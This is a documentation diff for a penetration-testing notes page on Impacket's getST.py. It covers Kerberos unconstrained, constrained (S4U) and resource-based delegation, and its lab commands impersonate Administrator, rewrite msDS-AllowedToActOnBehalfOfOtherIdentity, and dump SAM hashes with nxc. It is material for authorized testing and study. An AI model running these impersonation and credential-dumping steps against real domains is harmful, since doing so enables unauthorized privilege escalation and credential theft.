@@ -9,6 +9,109 @@ hideFooterPagination: true
 
 {/* Generated from Commands/getst.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Identify which delegation model is present
+
+Unconstrained delegation, classic constrained delegation and resource-based constrained delegation describe different trust relationships. Start with the account/computer attributes, the service principal names, and the object rights your identity actually holds.
+
+### Read the relevant attributes
+
+```powershell
+Get-ADComputer -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount
+Get-ADUser -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,ServicePrincipalName
+```
+
+Inspect a promising object directly to avoid losing attributes in a wide table:
+
+```powershell
+Get-ADComputer TARGET_HOST -Properties * | Select-Object Name,ServicePrincipalName,TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo,PrincipalsAllowedToDelegateToAccount | Format-List
+```
+
+The target resource's delegation configuration and the controlled account's configuration have different meanings. Preserve the actual distinguished names and SPNs.
+
+### Match the finding to its prerequisites
+
+| Model | Relationship to verify |
+| --- | --- |
+| Unconstrained | You control the relevant service/host and a usable delegated ticket becomes available in that context |
+| Classic constrained | The controlled service account can delegate to the specified SPN, with the required S4U/protocol-transition conditions |
+| Resource-based constrained | The resource's allowed-to-act configuration authorizes the controlled service principal, and the relevant object right/configuration is present |
+
+Sensitive-account settings, Protected Users, ticket encryption and current domain behavior can prevent a proposed path. Do not assume every privileged account can be impersonated.
+
+### Inspect tickets and request the exact service
+
+```bash
+klist
+impacket-getST 'DOMAIN_FQDN/SERVICE_ACCOUNT' -spn cifs/TARGET_FQDN -dc-ip DC_IP
+```
+
+That is an ordinary service-ticket request. An S4U request adds a separate impersonation step and is meaningful only after the delegation prerequisites are verified:
+
+```bash
+impacket-getST 'DOMAIN_FQDN/SERVICE_ACCOUNT' -spn cifs/TARGET_FQDN \
+  -impersonate LAB_TARGET_USER -dc-ip DC_IP
+```
+
+Read the tool's returned filename rather than assuming a fixed cache name. Inspect the cache and select it explicitly for the intended client:
+
+```bash
+export KRB5CCNAME='/absolute/path/RETURNED_CACHE.ccache'
+klist
+```
+
+### Verify the service result and preserve state
+
+Use a Kerberos-capable client against the matching target hostname and service. A ticket for one SPN is not a universal credential. If an RBCD lab modifies an attribute, record its original value and the exact principal added, verify the resulting state, and restore the intended baseline afterward. A failed request should send you back to identity, SPN, delegation settings, account protections, DNS and time—not immediately to a different guessed payload.
+
+## getST.py: choose the operation and read the result
+
+Request a Kerberos service ticket.
+
+### What the result establishes
+
+Inspect the requested SPN and returned service identity before using the cache with a client.
+
+### Prerequisites and common failures
+
+Ordinary service-ticket requests and S4U impersonation require different rights; delegation configuration and protected-account restrictions can prevent impersonation.
+
+### Example 1: Commands
+
+Run in: **Kali**. Requires the relevant delegation configuration/rights; credentials alone do not grant impersonation.
+
+```bash
+impacket-getST -spn cifs/TARGET_FQDN -impersonate USER_TO_IMPERSONATE -dc-ip DC_IP 'DOMAIN/SERVICE_ACCOUNT:PASSWORD'
+```
+
+### Example 2: Constrained (S4U)
+
+Run in: **Saved lab example**.
+
+```bash
+# You control an account with "allowed to delegate to" a service
+getST.py -spn cifs/target $DOMAIN/svc:PASS -impersonate Administrator -dc-ip $DC
+export KRB5CCNAME=Administrator.ccache
+nxc smb target -k --sam
+```
+
+Saved context: [Kerberos Delegation: Quick Reference — Constrained (S4U)](/active-directory/delegation#constrained-s4u). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Resource-Based (RBCD)
+
+Run in: **Saved lab example**.
+
+```bash
+# You have GenericWrite over a computer object -> set msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
+getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
+```
+
+Saved context: [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Request a Kerberos service ticket.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=getst) · [All tools](/index)
@@ -20,6 +123,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 impacket-getST -spn cifs/TARGET_FQDN -impersonate USER_TO_IMPERSONATE -dc-ip DC_IP 'DOMAIN/SERVICE_ACCOUNT:PASSWORD'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Delegation: Quick Reference — Example 1: Commands](/active-directory/delegation#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Requires the relevant delegation configuration/rights; credentials alone do not grant impersonation.
 
@@ -44,6 +154,13 @@ export KRB5CCNAME=Administrator.ccache
 nxc smb target -k --sam
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Delegation: Quick Reference — Example 2: Constrained (S4U)](/active-directory/delegation#example-2-constrained-s4u) · [Kerberos Delegation: Quick Reference — Constrained (S4U)](/active-directory/delegation#constrained-s4u)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Resource-Based (RBCD)">
@@ -57,6 +174,13 @@ nxc smb target -k --sam
 rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write $DOMAIN/USER:PASS
 getST.py -spn cifs/TARGET -impersonate Administrator $DOMAIN/FAKE$:PASS
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Delegation: Quick Reference — Example 3: Resource-Based (RBCD)](/active-directory/delegation#example-3-resource-based-rbcd) · [Kerberos Delegation: Quick Reference — Example 1: Resource-Based (RBCD)](/active-directory/delegation#example-1-resource-based-rbcd) · [Kerberos Delegation: Quick Reference — Resource-Based (RBCD)](/active-directory/delegation#resource-based-rbcd)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -72,6 +196,13 @@ Context from the notebook: AllowedToDelegate Constrained delegation (S4U2Proxy) 
 impacket-getST -spn <spn> -impersonate Administrator 'dom/user:pass'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Delegation & domain edges](/cheatsheets/bloodhound-complete-guide#delegation-&-domain-edges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **BloodHound: Full Reference**
 
 Context from the notebook: AllowedToAct  (RBCD) You can configure RBCD on the target computer add a controlled computer, set  msDS-AllowedToActOnBehalfOfOtherIdentity , then  getST -impersonate Administrator
@@ -79,6 +210,13 @@ Context from the notebook: AllowedToAct  (RBCD) You can configure RBCD on the ta
 ```text
 getST -impersonate Administrator
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Delegation & domain edges](/cheatsheets/bloodhound-complete-guide#delegation-&-domain-edges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -94,6 +232,21 @@ Context from the notebook: Kerberos GetUserSPNs.py ,  GetNPUsers.py ,  getTGT.py
 getST.py
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Pass the Ticket from Linux](/password-attacks/pass-the-ticket-from-linux)
+
+{/* VAULT_RELATED_END */}
